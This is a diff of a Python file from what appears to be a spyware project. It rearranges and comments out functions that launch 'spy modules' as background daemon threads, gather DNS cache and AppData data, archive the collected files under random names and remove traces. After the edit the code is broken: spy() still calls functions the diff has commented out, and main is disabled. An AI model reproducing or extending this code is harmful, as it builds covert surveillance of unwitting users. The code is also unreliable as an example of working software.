@@ -146,70 +146,6 @@ modules: Dict[str, str] = {
 if __name__ == "__main__":
     print(copyright)
     exit(main())
-
-def join_all(*threads: List[Thread]) -> None:
-
-    """
-    This function join threads.
-    """
-
-    for thread in threads:
-        thread.join()
-
-def stop_deamons(*daemons: List[Thread]) -> None:
-
-    """
-    This function sent daemon's stop signal.
-    """
-
-    for daemon in daemons:
-        daemon.run = False
-
-def spy(modules: Dict[str, str]) -> int:
-
-    """
-    This function starts spy modules and stop it on KeyboardInterrupt.
-    """
-
-    EXITCODE = 0
-    namespace = globals().copy()
-    namespace.update(locals())
-    threads = []
-    daemons = []
-
-    for module, config in modules.items():
-        module = module.lower()
-
-        config = namespace[f"{module}Config"](config)
-        daemon = namespace[f"{module.title()}Daemon"]()
-
-        daemons.append(daemon)
-
-        if module == "domains":
-            thread = Thread(target=daemon.run_CacheDns)
-            thread.daemon = True
-            threads.append(thread)
-            thread.start()
-
-            thread = Thread(target=daemon.run_AppData)
-            thread.daemon = True
-            threads.append(thread)
-            thread.start()
-        else:
-            thread = Thread(target=daemon.run_for_ever)
-            thread.daemon = True
-            threads.append(thread)
-            thread.start()
-
-    try:
-        join_all(*threads)
-    except KeyboardInterrupt:
-        stop_deamons(*daemons)
-    finally:
-        join_all(*threads)
-
-    return EXITCODE
-
 # def env(keyvalue: str) -> None:
 #
 #     """
@@ -224,7 +160,6 @@ def spy(modules: Dict[str, str]) -> int:
 #
 #     key, value = keyvalue.split("=", 1)
 #     environ[key] = value
-
 # def parse_args() -> Namespace:
 #
 #     """
@@ -317,6 +252,157 @@ def spy(modules: Dict[str, str]) -> int:
 #         )
 #
 #     return arguments.parse_args()
+# def archive(modules: Dict[str, str] = modules, mode: str = "") -> str:
+#
+#     """
+#     This function archives data.
+#     """
+#
+#     name = choices(ascii_letters + digits, k=choice(range(1, 15)))
+#     filename = f"archive_{name}.tar" + f".{mode}" if mode else mode
+#
+#     namespace = globals().copy()
+#     namespace.update(locals())
+#
+#     with tar_open(filename, f"w:{mode}") as file:
+#
+#         for module in modules:
+#             dir_name = getattr(
+#                 namespace[f"{module}_config"], "save_dirname", None
+#             )
+#             filename = getattr(
+#                 namespace[f"{module}_config"], "save_filename", None
+#             )
+#
+#             if dir_name and exists(dir_name):
+#                 for filename in listdir(dir_name):
+#                     file.add(filename)
+#             elif filename and exists(filename):
+#                 file.add(filename)
+# def get_modules(arguments: Namespace) -> Dict[str, str]:
+#
+#     """
+#     This function builds the modules dict from arguments.
+#     """
+#
+#     modules_config = arguments.__dict__.copy()
+#
+#     is_mode_donotrun = arguments.modules == "donotrun"
+#
+#     cleandict(
+#         modules_config, ["env", "enable", "remove", "modules", "install"]
+#     )
+#
+#     if is_mode_donotrun:
+#         modules_copy = modules.copy()
+#     else:
+#         active_modules = {}
+#
+#     for module, config in modules_config.items():
+#         if is_mode_donotrun:
+#             if config is not None:
+#                 del modules_copy[module]
+#         else:
+#             if config is not None:
+#                 active_modules[module] = config
+#
+#     return modules_copy if is_mode_donotrun else active_modules
+# def main() -> int:
+#
+#     """
+#     This function launchs the SpyWare modules from the command line.
+#     """
+#
+#     arguments = parse_args()
+#
+#     if arguments.install:
+#         install()
+#     elif arguments.enable:
+#         enabled()
+#
+#     if arguments.modules is None:
+#         active_modules = modules
+#     else:
+#         active_modules = get_modules(parse_args())
+#
+#     tar = arguments.tar
+#     if arguments.remove:
+#         register(remove_trace, active_modules)
+#     elif tar is not None:
+#         register(archive, active_modules, tar)
+#
+#     EXITCODE = spy(active_modules)
+#
+    # tar = arguments.tar
+    # if arguments.remove:
+    #     remove_trace(active_modules)
+    # elif tar is not None:
+    #     archive(active_modules, tar)
+#
+#     return EXITCODE
+
+# def join_all(*threads: List[Thread]) -> None:
+#
+#     """
+#     This function join threads.
+#     """
+#
+#     for thread in threads:
+#         thread.join()
+
+# def stop_deamons(*daemons: List[Thread]) -> None:
+#
+#     """
+#     This function sent daemon's stop signal.
+#     """
+#
+#     for daemon in daemons:
+#         daemon.run = False
+
+def spy(modules: Dict[str, str]) -> int:
+
+    """
+    This function starts spy modules and stop it on KeyboardInterrupt.
+    """
+
+    EXITCODE = 0
+    namespace = globals().copy()
+    namespace.update(locals())
+    threads = []
+    daemons = []
+
+    for module, config in modules.items():
+        module = module.lower()
+
+        config = namespace[f"{module}Config"](config)
+        daemon = namespace[f"{module.title()}Daemon"]()
+
+        daemons.append(daemon)
+
+        if module == "domains":
+            thread = Thread(target=daemon.run_CacheDns)
+            thread.daemon = True
+            threads.append(thread)
+            thread.start()
+
+            thread = Thread(target=daemon.run_AppData)
+            thread.daemon = True
+            threads.append(thread)
+            thread.start()
+        else:
+            thread = Thread(target=daemon.run_for_ever)
+            thread.daemon = True
+            threads.append(thread)
+            thread.start()
+
+    try:
+        join_all(*threads)
+    except KeyboardInterrupt:
+        stop_deamons(*daemons)
+    finally:
+        join_all(*threads)
+
+    return EXITCODE
 
 def get_random_path() -> Tuple[str, str, str]:
 
@@ -474,104 +560,13 @@ def remove_trace(modules: Dict[str, str] = modules) -> None:
         if exists(config):
             remove(config)
 
-# def archive(modules: Dict[str, str] = modules, mode: str = "") -> str:
+# def cleandict(dict_: dict, keys: List[Hashable]) -> dict:
 #
 #     """
-#     This function archives data.
+#     This function clean a dictionary.
 #     """
 #
-#     name = choices(ascii_letters + digits, k=choice(range(1, 15)))
-#     filename = f"archive_{name}.tar" + f".{mode}" if mode else mode
-#
-#     namespace = globals().copy()
-#     namespace.update(locals())
-#
-#     with tar_open(filename, f"w:{mode}") as file:
-#
-#         for module in modules:
-#             dir_name = getattr(
-#                 namespace[f"{module}_config"], "save_dirname", None
-#             )
-#             filename = getattr(
-#                 namespace[f"{module}_config"], "save_filename", None
-#             )
-#
-#             if dir_name and exists(dir_name):
-#                 for filename in listdir(dir_name):
-#                     file.add(filename)
-#             elif filename and exists(filename):
-#                 file.add(filename)
-
-def cleandict(dict_: dict, keys: List[Hashable]) -> dict:
-
-    """
-    This function clean a dictionary.
-    """
-
-    for key in keys:
-        if key in dict_:
-            del dict_[key]
-    return dict_
-
-# def get_modules(arguments: Namespace) -> Dict[str, str]:
-#
-#     """
-#     This function builds the modules dict from arguments.
-#     """
-#
-#     modules_config = arguments.__dict__.copy()
-#
-#     is_mode_donotrun = arguments.modules == "donotrun"
-#
-#     cleandict(
-#         modules_config, ["env", "enable", "remove", "modules", "install"]
-#     )
-#
-#     if is_mode_donotrun:
-#         modules_copy = modules.copy()
-#     else:
-#         active_modules = {}
-#
-#     for module, config in modules_config.items():
-#         if is_mode_donotrun:
-#             if config is not None:
-#                 del modules_copy[module]
-#         else:
-#             if config is not None:
-#                 active_modules[module] = config
-#
-#     return modules_copy if is_mode_donotrun else active_modules
-
-# def main() -> int:
-#
-#     """
-#     This function launchs the SpyWare modules from the command line.
-#     """
-#
-#     arguments = parse_args()
-#
-#     if arguments.install:
-#         install()
-#     elif arguments.enable:
-#         enabled()
-#
-#     if arguments.modules is None:
-#         active_modules = modules
-#     else:
-#         active_modules = get_modules(parse_args())
-#
-#     tar = arguments.tar
-#     if arguments.remove:
-#         register(remove_trace, active_modules)
-#     elif tar is not None:
-#         register(archive, active_modules, tar)
-#
-#     EXITCODE = spy(active_modules)
-#
-    # tar = arguments.tar
-    # if arguments.remove:
-    #     remove_trace(active_modules)
-    # elif tar is not None:
-    #     archive(active_modules, tar)
-#
-#     return EXITCODE
+#     for key in keys:
+#         if key in dict_:
+#             del dict_[key]
+#     return dict_
